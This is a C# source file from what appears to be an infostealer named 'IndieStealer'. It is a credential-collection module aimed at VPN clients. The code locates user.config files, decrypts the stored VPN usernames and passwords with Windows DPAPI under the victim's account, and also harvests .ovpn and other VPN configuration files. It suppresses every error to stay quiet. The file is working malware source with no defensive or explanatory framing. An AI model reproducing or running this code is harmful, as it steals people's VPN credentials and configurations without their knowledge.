using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace IndieStealer.Collect.VPNs
{
    public class VPNClient
    {
        public static void Collect()
        {
            foreach (var vpnClient in VPNClientObject.VPNClientList)
            {
                if (vpnClient.Path == null || vpnClient.Path == String.Empty)
                    continue;
                if (vpnClient.IsCredentials)
                {
                    if (vpnClient.SearchPattern != null)
                    {
                        try
                        {
                            var dirs = Directory.GetDirectories(vpnClient.Path,vpnClient.SearchPattern);
                            List<string> credentials = null;
                            foreach (var dir in dirs)
                            {
                                var subdirs = Directory.GetDirectories(dir);
                                foreach (var subDir in subdirs)
                                {
                                    if (File.Exists(subDir + "\\user.config"))
                                    {
                                        var doc = new XmlDocument();
                                        doc.Load(subDir + "\\user.config");
                                        var txt = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                                        var txt2 = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
                                        if (txt == null && txt2 == null)
                                            continue;
                                        credentials = new List<string>();
                                        byte[] unprotectUser = null;
                                        byte[] unprotectPass = null;
                                        try
                                        {
                                            unprotectUser = ProtectedData.Unprotect(Convert.FromBase64String(txt), null,
                                                DataProtectionScope.CurrentUser);
                                            unprotectPass = ProtectedData.Unprotect(Convert.FromBase64String(txt2), null,
                                                DataProtectionScope.CurrentUser);
                                        }
                                        catch (Exception ex)
                                        { }
                                        if (unprotectUser != null)
                                            credentials.Add("Username: " + Encoding.UTF8.GetString(unprotectUser) + Environment.NewLine);
                                        if (unprotectPass != null)
                                            credentials.Add("Password: " + Encoding.UTF8.GetString(unprotectPass) + Environment.NewLine + "________________________" + Environment.NewLine);

                                    }
                                }
                            }
                            if (credentials != null && credentials.Any())
                                vpnClient.Data = credentials.ToArray();
                        }
                        catch (Exception exception)
                        {}
                        //var directory = new DirectoryInfo(NordVPNDir);
                        
                    }
                    
                }
                else
                {
                    if (vpnClient.IsDataMultiple)
                    {
                        if (vpnClient.IsFile)
                        {
                            try
                            {
                                if (vpnClient.SearchPattern != null)
                                {
                                    if (!Directory.Exists(vpnClient.Path)) 
                                        continue;
                                    string[] files = Directory.GetFiles(vpnClient.Path);
                                    if (files == null || files.Length < 1)
                                        continue;
                                    vpnClient.Data = new string[files.Length];
                                    for (int n = 0,i = 0; i < files.Length; i++)
                                    {
                                        if (files[i].EndsWith("ovpn"))
                                            vpnClient.Data[n++] = files[i];
                                    }
                                }
                                if (vpnClient.FolderFilter != null)
                                {
                                    if (!Directory.Exists(vpnClient.Path))
                                        continue;          
                                    string[] configDirs = Directory.GetDirectories(vpnClient.Path);
                                    if (configDirs == null || configDirs.Length < 1)
                                        continue;
                                    string configDir = configDirs.Where(x => x.Replace(vpnClient.Path,"").Contains(vpnClient.FolderFilter))?.First();
                                    if (configDir == null)
                                        continue;
                                    var directoryInfo = Directory.GetDirectories(configDir);
                                    vpnClient.Data = new string[directoryInfo.Length];
                                    for (int i = 0; i < directoryInfo.Length; i++)
                                    {
                                        var file = Directory.GetFiles(directoryInfo[i]);
                                        if (file.Length > 0) vpnClient.Data[i] = file[0];
                                    }
                                }
                                vpnClient.Data = vpnClient.Data.Where(x => !string.IsNullOrEmpty(x))?.ToArray();
                            }
                            catch (Exception exception)
                            {}
                            
                        }
                    }
                }
            }
        }
    }
}